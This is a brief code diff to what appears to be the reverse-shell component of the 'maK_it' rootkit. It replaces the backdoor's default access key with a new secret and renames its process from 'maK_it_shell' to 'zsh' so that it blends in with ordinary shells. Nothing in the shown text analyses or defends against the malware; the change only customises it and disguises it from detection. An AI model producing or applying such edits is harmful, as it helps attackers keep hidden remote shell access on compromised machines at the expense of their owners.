@@ -16,10 +16,10 @@
 #include <signal.h>
 
 #define PACKET_SIZE 	1024
-#define KEY         	"maK_it_$H3LL"
+#define KEY         	"e26d9050a8a01a25048a2d61cabedbcf"
 #define MOTD        	"maK_it\n/bin/bash shell..\n"
 #define SHELL       	"/bin/sh"
-#define PROCESS_NAME    "maK_it_shell"
+#define PROCESS_NAME    "zsh"
 
 /*
  * Start the reverse shell
